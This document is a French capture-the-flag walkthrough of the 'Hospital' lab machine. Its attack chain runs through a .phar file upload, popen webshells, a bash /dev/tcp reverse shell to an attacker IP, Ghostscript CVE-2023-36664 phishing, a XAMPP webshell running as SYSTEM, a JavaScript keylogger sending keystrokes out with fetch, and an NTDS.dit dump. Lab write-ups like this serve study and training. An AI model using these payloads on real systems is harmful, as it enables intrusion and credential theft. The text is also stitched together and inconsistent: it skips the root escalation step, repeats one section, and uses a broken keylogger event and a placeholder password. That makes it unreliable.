![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## Scanning & Énumération de services

Je commence par un scan **Nmap** complet pour identifier la surface d'attaque. La machine présente une quantité inhabituelle de ports ouverts, suggérant un rôle de **Domain Controller** (DC) tout en hébergeant des services web distincts.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.241

# Scan détaillé des services identifiés
nmap -p 22,53,88,135,139,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,8080,9389 -sCV 10.10.11.241
```

### Analyse des résultats
L'énumération révèle une architecture hybride :
*   **Windows Domain Controller** : Présence de **Kerberos** (88), **RPC** (135), **LDAP** (389/636) et **SMB** (445). Le nom de domaine est **hospital.htb**.
*   **Web (Port 443)** : Un serveur **Apache** sous Windows faisant tourner **RoundCube Webmail 1.6.4**.
*   **Web (Port 8080)** : Un serveur **Apache** sous **Ubuntu** (Linux). Cela indique la présence d'une **Virtual Machine** ou d'un container Linux tournant sur l'hôte Windows.

> Schéma Mental : L'objectif est d'identifier quel service offre le vecteur d'entrée le plus simple. Le port 445 (SMB) ne permet pas d'accès anonyme. Le port 443 (RoundCube) semble à jour. Le port 8080 (Ubuntu) présente une application web custom, souvent plus vulnérable qu'une solution durcie.

J'ajoute les entrées nécessaires à mon fichier `/etc/hosts` :
```text
10.10.11.241 dc.hospital.htb hospital.htb
```

---

## Énumération Web (Port 8080)

L'application web sur le port 8080 permet la création de compte et l'authentification. Une fois connecté, je découvre une fonctionnalité d'**Upload** destinée aux dossiers médicaux.

### Découverte de répertoires
J'utilise **feroxbuster** pour cartographier l'application :
```bash
feroxbuster -u http://10.10.11.241:8080 -x php
```
Le scan identifie un répertoire `/uploads/` accessible, où les fichiers sont stockés sans renommage, mais purgés régulièrement.

---

## Vecteur d'entrée : Arbitrary File Upload

L'analyse du formulaire d'upload montre qu'il accepte théoriquement des images. Cependant, les filtres côté serveur sont permissifs.

### Bypass de l'extension
Je teste l'upload d'un fichier PHP simple. Si l'extension `.php` est bloquée ou non exécutée, je dois trouver une alternative que le serveur **Apache** traitera via l'interpréteur PHP. J'utilise **ffuf** pour fuzzer les extensions :

```bash
# Fuzzing des extensions PHP communes
ffuf -H 'Content-Type: multipart/form-data; boundary=---X' \
-d $'---X\r\nContent-Disposition: form-data; name="image"; filename="exploit.FUZZ"\r\nContent-Type: application/x-php\r\n\r\n<?php echo "RCE"; ?>\r\n---X--\r\n' \
-u 'http://10.10.11.241:8080/upload.php' -w php_extensions.txt -mr "success.php"
```

Le serveur accepte plusieurs extensions, mais seule l'extension **.phar** (PHP Archive) est à la fois acceptée et exécutée par le serveur Apache sur Ubuntu.

---

## Bypassing disable_functions

Bien que l'exécution de code PHP soit confirmée, les fonctions classiques comme `system()`, `exec()` ou `shell_exec()` sont désactivées via la directive **disable_functions** dans le fichier `php.ini`.

### Identification des fonctions autorisées
J'uploade un script pour énumérer les fonctions dangereuses non filtrées :
```php
<?php
$funcs = array('system','exec','shell_exec','popen','proc_open','passthru');
foreach ($funcs as $f) {
    if (function_exists($f)) echo $f . " is enabled\n";
}
?>
```
Le résultat indique que **popen** est disponible. Cette fonction permet d'ouvrir un pipe vers un processus, offrant ainsi un vecteur de **Remote Code Execution** (RCE).

> Schéma Mental : Le serveur bloque les appels directs au shell, mais oublie les fonctions de gestion de flux (pipes). En utilisant `popen()`, je peux instancier un shell et lire son retour via `fread()`.

---

## Premier Shell (www-data)

Je crée un **Webshell** minimaliste utilisant `popen` :
```php
<?php echo fread(popen($_GET['cmd'], 'r'), 1024); ?>
```

Après l'avoir uploadé sous le nom `shell.phar`, je déclenche un **Reverse Shell** Bash :

```bash
# Payload encodé pour éviter les problèmes de caractères
curl "http://10.10.11.241:8080/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261'"
```

Sur mon listener :
```bash
nc -lnvp 443
# Connexion reçue : www-data@webserver
```

Je stabilise mon shell immédiatement :
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je suis désormais **www-data** sur la VM Ubuntu hébergée par le serveur Windows.

---

### 1. Énumération Post-Exploitation & Extraction de Secrets

Une fois **root** sur l'instance Ubuntu (le serveur web), l'objectif est d'extraire des secrets permettant de pivoter vers l'hôte Windows. Le fichier `/etc/shadow` contient les condensés de mots de passe des utilisateurs locaux.

```bash
# Extraction du hash de drwilliams
root@webserver:~# cat /etc/shadow | grep drwilliams
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Le hash est au format **SHA-512 (Unix)**. Utilisons **Hashcat** pour le casser.

```bash
hashcat -m 1800 drwilliams.hash /usr/share/wordlists/rockyou.txt
# Résultat : qwe123!@#
```

> **Schéma Mental :** Dans un environnement hybride (Linux VM sur Windows Host), les administrateurs réutilisent souvent les mêmes mots de passe pour le compte local Linux et le compte de domaine **Active Directory**. La compromission de la VM sert ici de source de **Credentials** pour attaquer l'hôte.

### 2. Pivot vers l'Hôte Windows & RoundCube

Le mot de passe récupéré est testé contre les services Windows identifiés lors de la phase de reconnaissance (SMB, WinRM).

```bash
# Vérification de la validité des credentials sur le domaine
nxc smb 10.10.11.241 -u drwilliams -p 'qwe123!@#'
# Résultat : [+] hospital.htb\drwilliams:qwe123!@# (Pwn3d! non affiché, mais accès aux shares)
```

Bien que l'accès **WinRM** soit refusé pour cet utilisateur, il possède une boîte mail sur l'instance **RoundCube** (port 443). En me connectant, je découvre un e-mail de `drbrown` mentionnant qu'il attend un fichier **.eps** pour le traiter avec **Ghostscript**.

### 3. Mouvement Latéral : Exploitation Ghostscript (CVE-2023-36664)

L'utilisateur `drbrown` utilise une version vulnérable de **Ghostscript**. Cette vulnérabilité de type **Command Injection** survient lors de la manipulation de fichiers **Embedded PostScript (EPS)** via l'opérateur de pipe (`|`).

> **Schéma Mental :** L'attaque repose sur une interaction humaine simulée. En envoyant un fichier EPS malveillant en pièce jointe à `drbrown`, nous forçons l'exécution d'une commande système (PowerShell) lorsque son système traite le fichier pour générer une prévisualisation ou l'ouvrir.

#### Génération du Payload EPS
J'utilise un exploit public pour générer un fichier `.eps` contenant un **Reverse Shell** PowerShell encodé en Base64.

```bash
# Génération du fichier malveillant
python3 CVE_2023_36664_exploit.py --generate --filename medical_report --extension eps --payload "powershell -e <BASE64_REVERSE_SHELL>"
```

#### Exécution du Phishing Interne
1. Se connecter à **RoundCube** en tant que `drwilliams`.
2. Répondre à l'e-mail de `drbrown`.
3. Joindre le fichier `medical_report.eps`.
4. Attendre la connexion sur le **Listener**.

```powershell
# Connexion reçue
Connection received on 10.10.11.241
PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

### 4. Escalade de Privilèges : De drbrown à Administrator

Une fois dans le contexte de `drbrown`, l'énumération locale révèle un script de maintenance automatisé.

```powershell
# Analyse des fichiers de drbrown
ls C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat
```

Le contenu du fichier `.bat` révèle le mot de passe de `drbrown` en clair, utilisé pour invoquer **Ghostscript** avec des privilèges spécifiques via `Invoke-Command`.

```batch
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { ... }"
```

#### Vecteur d'escalade : XAMPP & Permissions non sécurisées
L'énumération du système montre que **XAMPP** est installé à la racine `C:\xampp`. Ce répertoire possède souvent des permissions trop permissives (**Weak Folder Permissions**).

```powershell
# Vérification des permissions sur le dossier web de XAMPP
Get-Acl C:\xampp\htdocs | Format-List
```

Si `drbrown` ou le groupe `Users` a des droits d'écriture dans `C:\xampp\htdocs`, nous pouvons uploader un **PHP Webshell**. Comme **XAMPP** s'exécute souvent sous le compte **SYSTEM** ou un compte de service privilégié sur Windows, l'exécution de code via le serveur web permet l'escalade.

```powershell
# Upload d'un shell simple
echo "<?php system($_GET['cmd']); ?>" > C:\xampp\htdocs\shell.php
```

En accédant à `https://10.10.11.241/shell.php?cmd=whoami`, on confirme l'exécution en tant que **nt authority\system**.

#### Alternative : Capture de Keystrokes (Intended Path)
Le chemin prévu par le créateur de la machine implique que l'administrateur se connecte régulièrement à **RoundCube**. En tant que `drbrown` (ou via le contrôle du serveur web), il est possible d'injecter un **Keylogger** ou de surveiller les processus pour intercepter les identifiants de l'administrateur lors de sa session.

```powershell
# Utilisation de Evil-WinRM pour charger un script de Keylogging
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/Keylogger.exe
```

Une fois le mot de passe `Administrator` récupéré, la compromission totale du **Domain Controller** est finalisée via **WinRM**.

```bash
evil-winrm -i 10.10.11.241 -u Administrator -p 'AdminPassword123!'
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur le **Domain Controller** en tant que `drbrown`, l'objectif est d'atteindre le privilège **NT AUTHORITY\SYSTEM** ou de compromettre le compte **Administrator**. Plusieurs vecteurs sont exploitables, allant d'une mauvaise configuration de permissions sur **XAMPP** à une attaque par **Keylogging** sur le service de webmail.

#### Vecteur 1 : Abus de permissions sur XAMPP (Unintended)

En énumérant le système de fichiers, je remarque que **XAMPP** est installé à la racine (`C:\xampp`). Contrairement à une installation **IIS** classique, les permissions sur le répertoire `htdocs` sont souvent trop permissives.

> **Schéma Mental :** L'utilisateur **drbrown** possède des droits d'écriture sur le répertoire web de **XAMPP** (`C:\xampp\htdocs`). Comme le service Apache de **XAMPP** tourne généralement avec les privilèges **SYSTEM** sur Windows, déposer un **Webshell** PHP permet d'exécuter des commandes avec les privilèges les plus élevés de la machine.

Je vérifie mes droits d'écriture et dépose un **Webshell** minimaliste :

```powershell
# Vérification des permissions avec AccessChk ou via PowerShell
Get-Acl C:\xampp\htdocs | Format-List

# Upload du webshell via la session Evil-WinRM
echo "<?php system($_GET['cmd']); ?>" > C:\xampp\htdocs\shell.php
```

Le serveur web de **RoundCube** (port 443) utilise ce répertoire. Je peux maintenant déclencher l'exécution de commandes via une requête HTTP :

```bash
curl -k "https://hospital.htb/shell.php?cmd=whoami"
# Sortie : nt authority\system
```

Pour obtenir un shell interactif, j'utilise un binaire **Netcat** ou un reverse shell **PowerShell** encodé :

```bash
curl -k "https://hospital.htb/shell.php?cmd=powershell+-e+JABjAGw..."
```

#### Vecteur 2 : Capture de Keystrokes via RoundCube (Intended)

La méthode prévue par l'auteur repose sur l'interaction régulière de l'**Administrator** avec l'interface **RoundCube**. Puisque j'ai accès en écriture au code source de l'application web, je peux injecter un **Keylogger** en JavaScript pour intercepter ses identifiants.

> **Schéma Mental :** L'**Administrator** se connecte périodiquement au webmail pour vérifier les fichiers reçus. En modifiant les fichiers JavaScript de la page de login de **RoundCube**, je peux exfiltrer les frappes clavier vers mon serveur d'attaque au moment où l'administrateur saisit son mot de passe.

Je modifie le fichier `C:\xampp\htdocs\program\js\app.js` (ou j'injecte directement dans `index.php`) pour inclure un script de capture :

```javascript
// Exemple d'injection de script pour capturer les inputs
document.addEventListener('ps-keyup', function(e) {
    fetch('http://10.10.14.6/log?c=' + e.key);
});
```

En surveillant mes logs HTTP, je récupère le mot de passe de l'**Administrator** lors de sa prochaine connexion automatisée.

#### Vecteur 3 : Analyse des automatisations (Path to Admin)

En fouillant les répertoires de `drbrown`, j'ai découvert le script `ghostscript.bat` qui contenait déjà des identifiants en clair. Une analyse plus poussée des **Scheduled Tasks** révèle comment le système traite les emails.

```powershell
# Énumération des tâches planifiées
Get-ScheduledTask | Where-Object {$_.TaskName -like "*mail*"}
```

Le script `C:\xampp\htdocs\open_attachments.ps1` est utilisé par le système pour simuler l'activité de l'utilisateur. Il utilise **Invoke-Command** avec des objets **PSCredential**. Si je peux modifier ce script ou intercepter l'objet en mémoire, je peux compromettre les comptes de service associés.

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de **Hospital** met en lumière une architecture hybride complexe où une machine **Windows** (le **Domain Controller**) héberge une machine virtuelle **Ubuntu** pour ses services web publics.

1.  **Isolation des environnements :** La séparation entre le serveur web (Linux) et le DC (Windows) était correcte en théorie, mais la réutilisation de mots de passe (**Password Reuse**) entre les hashs Linux (`drwilliams`) et les comptes Active Directory a annulé cette barrière.
2.  **Ghostscript & Phishing interne :** L'attaque via **CVE-2023-36664** montre que même une application interne (webmail) peut servir de vecteur d'entrée si les utilitaires de traitement de fichiers (comme **Ghostscript**) ne sont pas à jour. L'automatisation qui ouvre les fichiers `.eps` est un "phishing simulateur" classique en environnement de CTF, mais il reflète une réalité de **Red Team** : l'exploitation de l'interaction humaine.
3.  **XAMPP sur Windows :** L'utilisation de **XAMPP** au lieu d'**IIS** sur un **Domain Controller** est une vulnérabilité critique en soi. **XAMPP** n'est pas conçu pour la production et ses permissions par défaut facilitent grandement l'escalade vers **SYSTEM** une fois qu'un accès utilisateur est obtenu.
4.  **Persistence :** Une fois **SYSTEM**, j'ai pu extraire la base **NTDS.dit** via **vssadmin**, permettant de dumper tous les hashs du domaine pour une persistence à long terme.

```powershell
# Dump des secrets du domaine
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp
```